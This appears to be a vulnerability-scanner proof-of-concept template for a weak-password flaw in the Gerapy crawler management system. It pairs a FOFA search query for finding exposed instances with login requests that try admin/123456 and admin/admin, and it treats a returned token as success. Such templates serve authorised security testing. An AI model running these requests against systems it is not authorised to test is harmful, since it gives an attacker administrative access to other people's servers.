id: poc-yaml-Gerapy-crawler-management-system-weak-password
info:
  name: Gerapy爬虫管理系统弱口令漏洞
  severity: medium
  tags:
  - 弱口令
  finger: gerapy
  fofa: title="Gerapy"
requests:
- method: POST
  path: /api/user/auth
  headers:
    Content-Type: application/json
  data: '{"username":"admin","password":"123456"}

    '
  expression: 'status_code == 400

    && contains(headers,"CPython")

    && contains(body,"\"non_field_errors\":[\"Unable to log in with provided credentials.\"]")

    && !contains(body,"<")

    '
- method: POST
  path: /api/user/auth
  headers:
    Content-Type: application/json
  data: '{"username":"admin","password":"admin"}

    '
  expression: 'status_code == 200

    && contains(headers,"CPython")

    && contains(body,"token")

    && !contains(body,"<")

    '
variables: {}
transport: http
